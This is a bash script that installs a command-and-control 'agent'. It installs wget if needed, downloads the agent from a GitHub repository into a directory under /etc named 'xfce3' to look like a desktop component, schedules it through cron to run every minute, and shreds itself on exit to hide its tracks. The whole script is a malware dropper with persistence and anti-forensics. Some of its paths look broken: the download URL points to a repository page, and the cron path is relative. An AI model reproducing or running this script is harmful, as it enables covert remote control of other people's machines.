#!/bin/bash

wget=/usr/bin/wget

TARGET_DIR="/etc/"
WGET_URL="https://github.com/routpalm/SUPERBASIC-C2/tree/main/agents/defaultagent"
NEW_DIR="xfce3"
FILE="defaultagent"
SCRIPT_PATH="$0"

delete_self() {
  echo "Shredding self..."; shred -u ${SCRIPT_PATH};
}
get_package_manager(){
  declare -A osInfo;
  osInfo[/etc/redhat-release]=yum
  osInfo[/etc/arch-release]=pacman
  osInfo[/etc/SuSE-release]=zypp
  osInfo[/etc/debian_version]=apt-get

  # shellcheck disable=SC2068
  for f in ${!osInfo[@]}
  do
      if [[ -f $f ]];then
          echo ${osInfo[$f]}
      fi
  done
}

package_manager="$(get_package_manager)"

if [ ! -x "$wget" ]; then
  echo "No wget. Downloading..." >&2
  if [ "$package_manager" = "yum" ];then
    yum install wget -y
  fi
  if [ "$package_manager" = "pacman" ];then
    pacman -S wget --noconfirm
  fi
  if [ "$package_manager" = "zypp" ];then
    zypper -n install wget
  fi
  if [ "$package_manager" = "apt-get" ];then
    apt-get install wget -y
  fi
fi

echo "Making new directory..."

if ! cd "$TARGET_DIR"; then
  echo "ERROR: can't access directory ($TARGET_DIR)" >&2
  exit 1
fi

if ! mkdir "$NEW_DIR"; then
  echo "ERROR: can't make directory ($NEW_DIR)" >&2
  exit 1
fi

if ! cd "$NEW_DIR"; then
  echo "ERROR: can't access directory ($NEW_DIR)" >&2
  exit 1
fi

echo "Downloading agent..."

if ! wget ${WGET_URL}; then
  echo "ERROR: can't download agent" >&2
  exit 1
fi

if ! chmod +x $FILE; then
  echo "ERROR: can't make agent executable" >&2
  exit 1
fi

echo "Agent downloaded... creating cronjob"

if ! cd ~; then
  echo "ERROR: Can't access user home directory" >&2
  exit 1
fi

if ! crontab -l > newcron; then
  echo "ERROR: Can't access crontab" >&2
  exit 1
fi
echo "* * * * * ./etc/xfce3/defaultagent" >> newcron

if ! crontab newcron; then
  echo "ERROR: Can't set crontab" >&2
  exit 1
fi
rm newcron

echo "Cronjob created."

trap delete_self EXIT
